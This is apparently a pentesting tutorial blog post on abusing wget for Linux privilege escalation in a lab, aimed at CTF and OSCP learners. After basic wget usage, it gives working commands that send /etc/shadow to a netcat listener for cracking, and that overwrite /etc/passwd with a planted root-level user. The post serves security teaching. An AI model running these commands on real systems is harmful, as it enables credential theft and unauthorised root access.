<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/privilege-escalation/" rel="category tag">Privilege Escalation</a></span>            </div>
            <h1 class="post-title entry-title">Linux for Pentester: Wget Privilege Escalation</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/linux-for-pentester-wget-privilege-escalation/" rel="bookmark"><time class="entry-date published" datetime="2019-06-10T14:57:56+00:00">June 10, 2019</time><time class="updated" datetime="2025-05-10T20:33:03+00:00">May 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">In this article, we are going to describe the entire utility of Wget command and how vital it is in Linux penetration testing. As Wget is used for downloading the files from the server so here we will learn that what else we can do by this command in Privilege Escalation.</span></p>
<p><em><strong>NOTE: “The main objective of publishing the series of “Linux for pentester” is to introduce the circumstances and any kind of hurdles that can be faced by any pentester while solving CTF challenges or OSCP labs which are based on Linux privilege escalations. Here we do not criticizing any kind of misconfiguration that a network or system administrator does for providing higher permissions on any programs/binaries/files &amp; etc.”</strong>  </em></p>
<h3><span style="color: #800000;"><strong>Table of Content</strong></span></h3>
<p><strong>Introduction to Wget</strong></p>
<ul>
<li>Major Operation performed using Wget</li>
</ul>
<p><strong>Exploiting Wget</strong></p>
<ul>
<li>Sudo Rights Lab setups for Privilege Escalation</li>
<li>Exploiting Sudo rights</li>
<li>SUID Lab setups for Privilege Escalation</li>
<li>Exploiting SUID</li>
</ul>
<h3><span style="color: #800000;"><strong>Introduction to Wget</strong></span></h3>
<p>The Wget command is a command line utility that enables the user to download single or multiple files simultaneously from internet or server by the help of many protocols like HTTP, HTTPS and FTP. This command performs many operations that can be used by any user while downloading any file from the internet such as: Downloading multiple files, downloading in the background, resuming downloading, renaming any downloaded file, Mirror downloading.</p>
<p>The more functionality of this command can be briefly understood by using its help command. Here we are using -h argument for this function. As we can see by the below image which showing list of many arguments that can be used with Wget command while executing it. For viewing as below image, we will simply type the command on our Linux screenshot as showing below:</p>
<pre class="lang:default decode:true">wget -h</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-UWRcRwgsc2Q/XP5rTWCoOII/AAAAAAAAevE/iEB1iKxaHd8zY9pm48xY1oDF3kJ9uxjcQCLcBGAs/s1600/1.png"/></p>
<h3><span style="color: #800000;"><strong>Major Operation performed using Wget</strong></span></h3>
<p><strong><em><u>To download a file:</u></em>  </strong>Wget command provides assistance to their user for downloading any file/webpage in both platforms i.e. in front of the current processing screen and also in the background. Here I’m downloading <strong><em>putty.exe</em></strong> file in this article to show the overall working process of Wget command. Type below command to download a single file which use the simple syntax: Wget (option) URL</p>
<pre class="lang:default decode:true">wget https://the.earth.li/~sgtatham/putty/latest/w32/putty.exe</pre>
<p><strong><em><u>To download a file in background: </u></em></strong>As we know Wget is a non-interactive downloader that allows the user to download the file in the background too without creating any hassle with the current process.</p>
<p>Here I’m using <strong>-b argument</strong> for this task following by the whole command as mentioned below.</p>
<pre class="lang:default decode:true">wget -b https://the.earth.li/~sgtatham/putty/latest/w32/putty.exe</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-IzM8mG6bSqE/XP5rV7zh5pI/AAAAAAAAevg/XLfp6fG8vpsgGpaJh5pGfoU3WTJb4y44wCLcBGAs/s1600/2.png"/></p>
<p><strong><em><u>To overwrite documents to file:</u></em></strong> Here in the below image, we are showing how one can move the documents of the downloaded file to any other file. We will use the -O (uppercase) argument for this function.</p>
<p>Type the below-mentioned command for the same, in which I have download putty.exe and obtain the output inside raj.exe.</p>
<pre class="lang:default decode:true">wget -O raj.exe https://the.earth.li/~sgtatham/putty/latest/w32/putty.exe</pre>
<p>After completing half download I’m pausing my file by simply pressing<strong> ctrl + c</strong> to stop my downloading in mid of session just to explain “<em>how we can retrieve or resume our downloading”</em> if we have any network failure issue power cut or any other reasons that can stop our downloading process.</p>
<p><strong><em><u>To resume any downloading process: </u></em></strong>As I have mentioned above if we have any issue or problems that can tend to fail in our downloading process by any mean then we can resume our uncompleted download by <strong>-c</strong> arguments. Find the below-mentioned command as per screenshot:</p>
<pre class="lang:default decode:true">wget -c -O raj.exe https://the.earth.li/~sgtatham/putty/latest/w32/putty.exe</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-0-sIe1xw6co/XP5rWW1Zf9I/AAAAAAAAevo/pns4w66CyvcQ2mVlQzwzA8LOU6JqxQnNwCLcBGAs/s1600/3.png"/></p>
<p><strong><em><u>To download multiple files simultaneously: </u></em></strong> Wget also allows the user to download multiple files simultaneously instead to download it one by one. Suppose we have any folder that contains multiple links and we want to download all the files together so we will use this command following by <strong>-i arguments</strong>.</p>
<p>Here I’m creating a file by the name of “<em>link”</em> which contains two links and I want to download both links together. Type the below-mentioned command for performing the same task:</p>
<pre class="lang:default decode:true">cat link
wget -i link</pre>
<p><strong> <img decoding="async" src="https://1.bp.blogspot.com/-riFLengT48c/XP5rWwE3C3I/AAAAAAAAevs/kMbnu7NLL94Cm_gzBrnXmwBMGrr-hRdKwCLcBGAs/s1600/4.png"/></strong></p>
<p><strong><em><u>To turn off output: </u></em></strong>Whenever we want to turn off the output of any downloading process then we can use <strong>-q</strong> arguments for the same. This argument helps the user to download the file in the background by turning off its standard output i.e. downloading the file with complete silence.</p>
<p>We will use Wget command with <strong>-q</strong> argument for this as shown below.</p>
<pre class="lang:default decode:true">wget -q https://the.earth.li/~sgtatham/putty/latest/w32/putty.exe</pre>
<p>There so many options inside wget but in this post, we have discussed very of them. Because our vision is to demonstrate privilege escalation by exploiting wget, therefore in the next phase you will learn how to exploit wget for escalating root shell.</p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-pthwfl3T6i0/XP5rXOFK6EI/AAAAAAAAevw/RWce_BHWxt8vAlQaSd45VBt1xXOBGbJhgCLcBGAs/s1600/5.png"/></p>
<h3><span style="color: #800000;"><strong><u>Exploiting wget</u></strong></span></h3>
<h3><span style="color: #800000;"><strong>Sudo Rights Lab setups for Privilege Escalation</strong></span></h3>
<p><span style="color: #000000;">Now we will set up our lab of Wget command with higher privilege i.e. with administrative rights. As we know the behavior of many commands get changed after getting higher privileges similarly, we will check for the Wget command that what impact it has after getting sudo rights and how we can use it further for privilege escalation.</span></p>
<p><span style="color: #000000;"><em>Refer to this </em><a style="color: #000000;" href="https://www.hackingarticles.in/linux-privilege-escalation-using-exploiting-sudo-rights/"><em>link</em></a><em> for more information about sudo rights </em></span></p>
<p><span style="color: #000000;">It can be clearly understood by the below image in which I have created a local user (test) who possess all sudo rights as root and can perform all task as admin.</span></p>
<p><span style="color: #000000;">To add sudo right open etc/sudoers file and type following as user Privilege specification.</span></p>
<pre class="lang:default decode:true">test  ALL=(root) NOPASSWD: /usr/bin/Wget</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-exI2jh9ZUIg/XP5rXEChkkI/AAAAAAAAev0/J3OwCOTr1Q4YdLxclee7LyMQ2wpdYO1_wCLcBGAs/s1600/6.png"/></p>
<h3><span style="color: #800000;"><strong>Exploiting Sudo rights</strong></span></h3>
<p>Now we will start exploiting Wget service by taking the privilege of sudoer’s permission. Suppose we got the sessions of victim’s machine that tend us to have local user access of the targeted system through which we can escalate the root user rights.</p>
<p>Very first we will connect to the target machine with ssh, therefore, type following command to get access through local user login.</p>
<pre class="lang:default decode:true">ssh test@192.168.1.22</pre>
<p>Then we look for sudo right of “test” user (if given) and found that user “test” can execute Wget command as “root” (since he has ALL user’s right) without a password.</p>
<pre class="lang:default decode:true">sudo -l</pre>
<p>Wget utilized the post-file option to send the content of any file. So, here we will use wget command to transfer the content of the /etc/shadow file.</p>
<pre class="lang:default decode:true">Syntax: sudo /usr/bin/wget --post-file=&lt;path of file&gt; &lt;Listening IP&gt;</pre>
<p>Since post-file will transfer the content of shadow file to the listening IP therefore, we should turn on the listener on the destination machine. Hence open a new terminal and start the netcat listener for receiving the sent data from the source machine.</p>
<p>Type the below command:</p>
<pre class="lang:default decode:true ">sudo /user/bin/wget --post-file=/etc/shadow 192.168.1.17</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-sZ8bOp2BO6c/XP5rYOUUmjI/AAAAAAAAev4/d8j8VhXj71EWZ6zcvd4rCBwEfsYrjnF_gCLcBGAs/s1600/7.png"/></p>
<p>As we had already turned on the netcat listener on port 80 to receive the content inside the “hash” file.</p>
<pre class="lang:default decode:true">nc -lvp 80 &gt; hash</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-ez6IOmbS4Nc/XP5rYOuGsyI/AAAAAAAAev8/5LJpYBl4EXEVmpGeLy4ZEtwDwRLZ61PqwCLcBGAs/s1600/8.png"/></p>
<p>After this, we will acquire the content of the shadow file of the victim’s machine inside our hash file and then we will use john the ripper to crack the hash value.</p>
<pre class="lang:default decode:true">Syntax: john &lt;file name&gt;
john hash</pre>
<p>Hmmm!! As we can observe from the given below image that it has cracked the password for user raj.</p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-rPCXMm37wms/XP5rYSPa0GI/AAAAAAAAewA/dcdTD6fl_C8Ww03XaV207HzIdcczLyZJQCLcBGAs/s1600/9.png"/></p>
<p>Since we got the credentials for the account of the user: raj so now, we can easily switch the user and will login as raj and further we tried to access root shell by switching.</p>
<pre class="lang:default decode:true">su raj
sudo su</pre>
<p>And finally, we got the root access hence in this way we spawn the root shell by exploiting wget command.</p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-EnrI0cdZYwc/XP5rThnkJiI/AAAAAAAAevI/YDXpHoc3NaApYCjrYkz9oCfFQ4HKh56gwCLcBGAs/s1600/10.png"/></p>
<h3><span style="color: #800000;"><strong>SUID Lab setups for Privilege Escalation</strong></span></h3>
<p>SUID: Set User ID is a type of permission that allows users to execute a file with the permissions of a specified user. Those files which have suid permissions run with higher privileges.  Assume we are accessing the target system as a non-root user and we found suid bit enabled binaries, then those file/program/command can run with root privileges.</p>
<p>Read more from here: <a href="https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/">https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/</a></p>
<p>Now we are going to give SUID permission on wget so that a local user can take the privilege of wget as the root user.</p>
<p>Hence type following for enabling SUID bit:</p>
<pre class="lang:default decode:true ">which wget
chmod u+s /usr/bin/wget
ls -al /usr/bin/wget</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-K_0VUnCZl84/XP5rTm50GpI/AAAAAAAAevA/-uDO00u08JoExhBYh0tGe19lAfyjEmhhQCLcBGAs/s1600/11.png"/></p>
<h3><span style="color: #800000;"><strong>Exploiting SUID</strong></span></h3>
<p>Now again compromise the target’s system and use find command to identify binaries having SUID permission.</p>
<pre class="lang:default decode:true">find / -perm -u=s -type f 2&gt;/dev/null</pre>
<p>So here we came to know that SUID bit is enabled for so many binary files, but we are interested in /usr/bin/wget.</p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-XAg-bRav81w/XP5rUfaZzPI/AAAAAAAAevM/SW0GlhrVYtMryeN3fqRmD4H52kgbwGGZQCLcBGAs/s1600/12.png"/></p>
<p>As we know, wget has suid permission and taking advantage of this right we will try to escalate the root privilege by injecting a new user inside the /etc/passwd file.</p>
<p>First, we will open our /etc/passwd file following by tail command which will read this file from its end and help us to know that the file ends with the user “test”.</p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-IO83kNbn-4w/XP5rUm1FeWI/AAAAAAAAevQ/0vfW-Xvb8HEaJFG-7d3-aXoW6rqKS0p5wCLcBGAs/s1600/16.png"/></p>
<p>Now we are creating the salt value of password for our new user and this will be done by using “openssl” following by the command as mentioned in the screenshot below.</p>
<pre class="lang:default decode:true">openssl passwd -1 -salt ignite pass123</pre>
<p>And we will get our hash value something like this: “<em>$1$ignite$3eTbJm980Hz.k1NTdNxe1</em>”; copy it for further use.</p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-JCXYUiEYipo/XP5rU2wfrLI/AAAAAAAAevU/q1B_eh1QXOQgFntuV1Ghb3T74zyglwHjQCLcBGAs/s1600/17.png"/></p>
<p>On moving ahead for the completion of this task now I have copied the entire content of /etc/passwd file in our local machine and will edit a new record for the user “ignite” then paste the above-copied hash password in the record as shown below.</p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-g7BbkgTsfyc/XP5rVfreQjI/AAAAAAAAevY/exmVpju8knU4ngz0pd5xqz8eBoIih7kEgCLcBGAs/s1600/18.png"/></p>
<p>Name this file as <strong>passwd</strong> and run python HTTP server for transferring this file into victim’s machine.</p>
<pre class="lang:default decode:true">python -m SimpleHTTPServer</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-339wnZVl0kk/XP5rVScSBcI/AAAAAAAAevc/UPi7kiJWKFEVsa4n4TU3sQp4pfBZVMMZQCLcBGAs/s1600/19.png"/></p>
<p>Now we want to inject our modified passwd file inside /etc folder to replace the original passwd file. We will use wget with -O to download the passwd file from our machine (Kali Linux) inside a/etc directory which will overwrite the existing passwd file.</p>
<pre class="lang:default decode:true">cd /etc
wget -O passwd http://192.168.1.108:8000/passwd</pre>
<p>Now let’s switch to ignite that owns the root user’s privileges and access the root shell.</p>
<pre class="lang:default decode:true">su ignite
password: pass123
id</pre>
<p>Hence you can notice from the given below image we have escalated the root privilege by abusing</p>
<p>SUID permission on wget.</p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-NI0NK-2Sf-o/XP5rWB0aOzI/AAAAAAAAevk/DFJ8CSpu9bcLfU0tsBpfzj7lvaocrs76gCLcBGAs/s1600/20.png"/></p>
<p><span style="color: #000000;"><strong>Author</strong>: Komal Singh is a Cyber Security Researcher and Technical Content Writer, she is completely enthusiastic pentester and Security Analyst at Ignite Technologies. Contact <a href="https://www.linkedin.com/in/komal-rajput-26b783131/"><strong>Here</strong></a></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
